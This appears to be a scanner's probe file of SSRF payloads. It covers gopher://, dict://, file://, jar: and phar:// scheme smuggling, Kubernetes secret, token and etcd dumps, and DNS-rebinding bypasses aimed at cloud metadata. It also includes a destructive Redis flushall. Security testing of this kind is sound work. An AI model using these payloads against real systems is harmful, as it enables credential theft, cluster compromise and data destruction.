{
  "category": "ssrf_protocol",
  "description": " \u2014 protocol smuggling + K8s in-cluster pivot",
  "contexts": {
    "protocol_smuggling": {
      "description": "Non-HTTP URI schemes that some HTTP clients still resolve. gopher:// is the king for raw-byte cross-protocol attacks (Redis, memcached, MySQL, SMTP). Java URL.openConnection accepts ftp://, file://, jar://, netdoc:// historically. PHP allows phar://, expect://, glob://. Curl's -L follows file:// across redirects.",
      "tech_match": [
        "java",
        "php",
        "curl"
      ],
      "param_match": [
        "url",
        "uri",
        "callback",
        "redirect",
        "fetch",
        "endpoint"
      ],
      "probes": [
        {
          "payload": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
          "description": "gopher:// to Redis 6379 \u2014 sends raw RESP-protocol bytes via HTTP-style fetch. flushall is destructive; replace with INFO for safety. Confirm by issuing a benign command first (Rule 5).",
          "matchers": [
            {
              "type": "word",
              "any": [
                "redis_version",
                "+OK",
                "PONG"
              ]
            },
            {
              "type": "timing",
              "min_ms": 100
            }
          ],
          "severity": "critical",
          "confidence_boost": 70,
          "variables": {
            "safety_note": "use INFO/PING, not FLUSHALL"
          }
        },
        {
          "payload": "gopher://127.0.0.1:11211/_stats%0d%0a",
          "description": "gopher:// to memcached 11211 \u2014 STATS command. Output dumps server stats and key prefixes.",
          "matchers": [
            {
              "type": "word",
              "any": [
                "STAT pid",
                "STAT version",
                "END"
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 55
        },
        {
          "payload": "dict://127.0.0.1:11211/stats",
          "description": "dict:// scheme to memcached. Curl-style libs accept dict://. Less stealthy than gopher but no encoding required.",
          "matchers": [
            {
              "type": "word",
              "any": [
                "STAT",
                "VERSION"
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 50
        },
        {
          "payload": "file:///etc/passwd",
          "description": "file:// scheme \u2014 Java URL.openConnection, PHP file_get_contents, Python urllib accept this. /etc/passwd content confirms file read.",
          "matchers": [
            {
              "type": "word",
              "any": [
                "root:x:0:0",
                "daemon:"
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 70
        },
        {
          "payload": "jar:file:///etc/passwd!/",
          "description": "jar: scheme on Java \u2014 file:// inside a jar URI. Some Java HTTP clients still resolve.",
          "matchers": [
            {
              "type": "word",
              "any": [
                "root:x:0:0"
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 65
        },
        {
          "payload": "netdoc:///etc/passwd",
          "description": "netdoc: legacy Java scheme that resolves like file://. Many WAFs miss it.",
          "matchers": [
            {
              "type": "word",
              "any": [
                "root:x:0:0"
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 60
        },
        {
          "payload": "phar:///tmp/test.phar/file.txt",
          "description": "PHP phar:// triggers unserialize on .phar metadata \u2014 distinct attack path from raw read. Useful when file_get_contents is filtered for file://.",
          "matchers": [
            {
              "type": "word",
              "any": [
                "unserialize",
                "phar"
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 55
        }
      ]
    },
    "protocol_variant": {
      "description": "SSRF via alternative protocol schemes \u2014 tests whether server-side fetchers support non-HTTP protocols that can interact with internal services",
      "tech_match": [],
      "param_match": [
        "url",
        "uri",
        "path",
        "dest",
        "redirect",
        "site",
        "html",
        "feed",
        "to",
        "out",
        "callback",
        "domain",
        "rurl",
        "return"
      ],
      "probes": [
        {
          "payload": "ftp://127.0.0.1/",
          "description": "FTP protocol SSRF \u2014 FTP banner (220, vsFTPd, ProFTPD) in response confirms server-side FTP client support",
          "matchers": [
            {
              "type": "word",
              "words": [
                "220",
                "vsFTPd",
                "ProFTPD",
                "FTP",
                "FileZilla",
                "Connection refused"
              ],
              "condition": "or"
            }
          ],
          "severity": "high",
          "confidence_boost": 60,
          "variables": {}
        },
        {
          "payload": "gopher://127.0.0.1:6379/_INFO%0d%0a",
          "description": "Gopher to Redis SSRF \u2014 gopher protocol sends raw bytes to Redis; redis_version in response confirms gopher support and Redis access",
          "matchers": [
            {
              "type": "word",
              "words": [
                "redis_version",
                "connected_clients",
                "used_memory",
                "-ERR"
              ],
              "condition": "or"
            }
          ],
          "severity": "critical",
          "confidence_boost": 85,
          "variables": {}
        },
        {
          "payload": "gopher://127.0.0.1:11211/_stats%0d%0a",
          "description": "Gopher to Memcached SSRF \u2014 sends stats command via gopher; STAT in response confirms Memcached access",
          "matchers": [
            {
              "type": "word",
              "words": [
                "STAT",
                "pid",
                "uptime",
                "version",
                "END"
              ],
              "condition": "or"
            }
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "ldap://127.0.0.1/",
          "description": "LDAP protocol SSRF \u2014 LDAP error or connection message confirms server-side LDAP client support and internal reach",
          "matchers": [
            {
              "type": "word",
              "words": [
                "ldap",
                "LDAP",
                "Distinguished Name",
                "NamingException",
                "LDAPException",
                "connection refused"
              ],
              "condition": "or"
            }
          ],
          "severity": "high",
          "confidence_boost": 55,
          "variables": {}
        },
        {
          "payload": "dict://127.0.0.1:6379/INFO",
          "description": "Dict protocol to Redis SSRF \u2014 dict:// sends raw command to Redis; redis_version confirms dict support and Redis access",
          "matchers": [
            {
              "type": "word",
              "words": [
                "redis_version",
                "connected_clients",
                "used_memory"
              ],
              "condition": "or"
            }
          ],
          "severity": "critical",
          "confidence_boost": 80,
          "variables": {}
        },
        {
          "payload": "file:///etc/hostname",
          "description": "File protocol SSRF \u2014 reads local files; non-empty response with short content (hostname) confirms file:// scheme is allowed",
          "matchers": [
            {
              "type": "length_diff",
              "min_diff": 2
            },
            {
              "type": "not_word",
              "words": [
                "not allowed",
                "blocked",
                "invalid",
                "denied",
                "unsupported"
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {}
        }
      ]
    },
    "k8s_in_cluster_pivot": {
      "description": "SSRF inside a Kubernetes pod has direct line-of-sight to: kubelet (10250), etcd (2379/2380), kube-apiserver (6443), service-account-token at /var/run/secrets/kubernetes.io/serviceaccount/token. Cluster-compromise primitive.",
      "tech_match": [
        "kubernetes",
        "k8s"
      ],
      "param_match": [
        "url"
      ],
      "probes": [
        {
          "payload": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
          "description": "kube-apiserver via in-cluster DNS. If pod has default service account with secrets read, attacker dumps cluster secrets.",
          "matchers": [
            {
              "type": "word",
              "any": [
                "SecretList",
                "kind\":\"Secret",
                "data\":"
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 75
        },
        {
          "payload": "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
          "description": "Service-account JWT token \u2014 used to authenticate to kube-apiserver. Combine with API call to escalate.",
          "matchers": [
            {
              "type": "regex",
              "pattern": "ey[A-Za-z0-9_-]+\\.ey[A-Za-z0-9_-]+\\."
            }
          ],
          "severity": "critical",
          "confidence_boost": 75
        },
        {
          "payload": "https://127.0.0.1:10250/pods",
          "description": "kubelet pods endpoint \u2014 if anonymous-auth enabled (older clusters), lists every pod on the node + container metadata.",
          "matchers": [
            {
              "type": "word",
              "any": [
                "PodList",
                "containerStatuses"
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 70
        },
        {
          "payload": "http://127.0.0.1:2379/v2/keys/?recursive=true",
          "description": "etcd v2 API \u2014 dumps the entire cluster key/value store including all Kubernetes objects. Modern etcd uses v3 gRPC, but legacy clusters expose v2 HTTP.",
          "matchers": [
            {
              "type": "word",
              "any": [
                "nodes\":",
                "createdIndex"
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 70
        }
      ]
    },
    "dns_rebind": {
      "description": "TOCTOU SSRF via DNS rebinding -- attacker controls a domain that resolves to a public IP for the validation check then re-resolves to 169.254.169.254 / 127.0.0.1 / 10.0.0.0/8 for the actual fetch. Detection focuses on apps that re-resolve the hostname per request and have a non-zero gap between validate() and fetch(). Use a controlled rebind domain (e.g. rbndr.us, lock.cmpxchg8b.com/rebinder.html or a self-hosted CoreDNS with low TTL).",
      "tech_match": [
        "java",
        "node",
        "python",
        "go",
        "php"
      ],
      "param_match": [
        "url",
        "uri",
        "callback",
        "fetch",
        "webhook",
        "avatar",
        "import_url",
        "source_url"
      ],
      "probes": [
        {
          "payload": "http://7f000001.c0a80001.rbndr.us/",
          "description": "rbndr.us alternates between 127.0.0.1 and 192.168.0.1 on consecutive resolves. If server fetches the URL and we see localhost banner / internal page in response, rebind succeeded.",
          "matchers": [
            {
              "type": "word",
              "any": [
                "localhost",
                "127.0.0.1",
                "internal",
                "admin",
                "apache2 ubuntu default page"
              ]
            },
            {
              "type": "status",
              "status": [
                200,
                502,
                503
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 65
        },
        {
          "payload": "http://make-127-0-0-1-rr-169-254-169-254.<COLLAB>/",
          "description": "Custom rebind via Collaborator-controlled DNS: first query returns a public IP (passes SSRF validator), second query returns 169.254.169.254 (AWS IMDS). The Collaborator interaction count will show 2+ DNS queries with TTL=0. Replace <COLLAB> with the operator-provided callback domain (Rule 9a).",
          "matchers": [
            {
              "type": "word",
              "any": [
                "ami-id",
                "instance-id",
                "iam",
                "meta-data"
              ]
            },
            {
              "type": "collaborator",
              "expect_dns_count_min": 2
            }
          ],
          "severity": "critical",
          "confidence_boost": 70,
          "variables": {
            "requires_collaborator": true
          }
        },
        {
          "payload": "http://0.0.0.0/",
          "description": "0.0.0.0 ambiguity probe -- on Linux this routes to localhost services bound to wildcard. Detection only -- if app fetches and returns a response that smells like an internal service, the URL parser does not reject 0.0.0.0.",
          "matchers": [
            {
              "type": "status",
              "status": [
                200,
                502
              ]
            },
            {
              "type": "word",
              "any": [
                "nginx",
                "apache",
                "gunicorn",
                "kestrel",
                "metrics"
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 50
        },
        {
          "payload": "http://[::ffff:127.0.0.1]/",
          "description": "IPv4-mapped IPv6 bypass for SSRF allowlists that only check IPv4 dotted-quad. Detection: app fetches and returns local-service content.",
          "matchers": [
            {
              "type": "status",
              "status": [
                200,
                502
              ]
            },
            {
              "type": "word",
              "any": [
                "localhost",
                "127.0.0.1",
                "internal"
              ]
            }
          ],
          "severity": "high",
          "confidence_boost": 55
        }
      ]
    }
  }
}